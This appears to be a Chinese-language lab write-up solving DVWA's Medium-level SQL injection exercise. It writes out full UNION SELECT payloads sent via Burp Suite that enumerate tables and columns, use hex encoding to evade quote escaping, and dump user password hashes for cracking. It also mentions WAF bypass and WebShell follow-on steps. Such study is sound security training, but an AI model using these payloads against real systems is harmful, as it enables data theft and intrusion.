DVWA-Medium-SQL注入 (SQL Injection)

2026年10月2日 DVWA Web安全 SQL注入 数字型注入

一、题目信息

  • 题目名称：DVWA SQL Injection (Medium)
  • 题目平台：DVWA (本地 Docker / 灵境靶场)
  • 题目类型：Web安全 / SQL注入 / 数字型注入 / Hex编码绕过
  • 靶场链接：http://192.168.242.80/vulnerabilities/sqli/
  • 涉及工具：Google Chrome 浏览器、Burp Suite

二、解题步骤

1. 分析题目考什么

本题的核心考点是在 Medium 安全级别下进行数字型 SQL 注入，并利用十六进制编码绕过单引号转义。与 Low 级别不同，Medium 级别的输入框变成了下拉菜单，后端代码去掉了单引号，并引入了 mysqli_real_escape_string 转义单引号。攻击者必须使用 Burp Suite 修改 POST 请求体，在无法使用单引号的情况下，通过构造 UNION SELECT 查询并利用 0x... 编码提取数据。

2. 怎么想（破题思路）

  • 前端界面变成下拉菜单，无法直接输入单引号。
  • 开启 Burp 抓包，发现是 POST 请求，参数为 id=1&Submit=Submit。
  • 将请求发送到 Repeater 模块，尝试 id=1 UNION SELECT 1,2，成功回显 First name: 1, Surname: 2，确认存在数字型注入。
  • 继续提取表名时，发现 table_name='users' 里的单引号被转义导致报错。
  • 使用 MySQL 的十六进制表示法 0x7573657273 替代 'users'，完美绕过转义。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：直接使用单引号导致 SQL 报错

踩坑情况：尝试查询 users 表的列名时，输入 id=1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'&Submit=Submit，页面报错 You have an error in your SQL syntax ... near ''users'''。

原因分析：Medium 级别后端使用了 mysqli_real_escape_string 函数，它会将输入中的单引号 ' 自动转义为 \'，导致 SQL 语句语法错误。

改进方式：使用 MySQL 的十六进制字符串表示法，将 'users' 替换为它的十六进制编码 0x7573657273。这样就不需要引号，从而绕过转义。

踩坑记录二：误以为 URL 地址栏也能注入

踩坑情况：直接在浏览器地址栏输入 ?id=1 UNION SELECT 1,2，页面直接返回 404 Not Found。

原因分析：Medium 级别使用的是 POST 请求，参数在请求体中。直接拼接在 URL 后面变成了 GET 请求，服务器找不到对应的路由。

改进方式：必须使用 Burp Suite 拦截 POST 请求，在 Repeater 模块的请求体（Body）中修改 id 参数。

详细实操步骤（Payload逐字解释）

第一步：探测回显位

在 Burp Repeater 中修改请求体为：id=1 UNION SELECT 1,2&Submit=Submit

响应结果：页面回显 First name: 1, Surname: 2，确认查询返回 2 个字段，且两个位置均可回显。

第二步：获取数据库名与版本

修改请求体为：id=1 UNION SELECT database(), version()&Submit=Submit

响应结果：回显 First name: dvwa, Surname: 10.1.26-MariaDB。

第三步：获取表名

修改请求体为：id=1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()&Submit=Submit

响应结果：回显 guestbook, users。

第四步：获取 users 表的列名（Hex 绕过）

修改请求体为：id=1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273&Submit=Submit

解释：0x7573657273 是 users 的十六进制编码。由于无法使用单引号，使用 Hex 编码可以完美绕过。

响应结果：回显 user_id, first_name, last_name, user, password, avatar, last_login, failed_login。

第五步：提取账号和密码哈希

修改请求体为：id=1 UNION SELECT user, password FROM users&Submit=Submit

响应结果：回显所有用户的账号和 MD5 密码哈希（如 admin / 5f4dcc3b5aa765d61d8327deb882cf99）。将其放入 cmd5.com 解密，即可获取明文密码。

4. 怎么迁移（跨领域联想）

  • WAF 绕过实战：在真实的护网中，WAF（Web应用防火墙）通常会对单引号进行严格拦截。攻击者会尝试使用 Hex 编码（0x...）、URL 编码、Unicode 编码等方式绕过过滤。这与本题的逻辑完全一致。
  • 安全开发启示：黑名单防御和简单的字符转义很难防住所有变种。正确的做法是使用预编译（Prepared Statements），将 SQL 代码与数据彻底分离，从根本上杜绝 SQL 注入。

三、名词大全与原理深度复盘

1. 数字型注入 (Numeric Injection)

当后端 SQL 语句中的参数没有引号包裹时（如 WHERE id = $id），攻击者无需闭合引号，直接拼接 UNION SELECT 等语句即可注入。

2. 十六进制编码 (Hex Encoding)

MySQL 支持使用 0x... 开头的十六进制字符串来表示字符串常量。例如 0x7573657273 等价于 'users'。使用 Hex 可以绕过单引号转义和部分 WAF 规则。

3. mysqli_real_escape_string

PHP 的 MySQL 扩展函数，用于转义 SQL 语句中的特殊字符（如单引号、双引号、反斜杠等）。它能防御字符型注入，但无法防御数字型注入和 Hex 编码绕过。

4. Burp Suite Repeater

Burp Suite 的核心模块之一，用于手动修改和重放 HTTP 请求。在 Medium 级别下，由于无法直接通过浏览器输入 Payload，必须使用 Repeater 来修改 POST 请求体。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Low 级别的区别：Low 级别是字符型注入，可以直接在输入框输入 1' UNION SELECT ...。Medium 级别是数字型注入，输入框变成了下拉菜单，且单引号被转义，需要使用 Hex 编码绕过。
  • 与 SQL 盲注的区别：本题是普通的 UNION 注入，有回显位，可以一次性爆出大量数据。盲注没有回显，只能逐字符推断。

2. 这种题目的出现原因（为什么存在）

漏洞存在的根本原因在于开发者认为前端做了限制（下拉菜单）就安全了，从而在后端放松了警惕。他们没有意识到，攻击者完全可以绕过前端界面，使用 Burp Suite 或其他工具直接向后端发送恶意的数字参数。

3. 这种的应用

在护网中，SQL 注入是“外网打点”的最高频漏洞之一。攻击者通过注入获取数据库中的管理员账号密码，登录后台后寻找文件上传点，最终拿到 WebShell，进入内网。

4. 如何抽象理解概念（大白话）

把数字型注入比作“点餐”：

  • 正常情况：你告诉服务员：“我要 1 号套餐。”（输入 1）
  • 恶意情况：你告诉服务员：“我要 1 号套餐，并且把后厨的所有菜谱都给我。”（输入 1 UNION SELECT ...）
  • 如果服务员不加思考（没做过滤），他真的会把菜谱也拿给你。这就是数字型 SQL 注入。
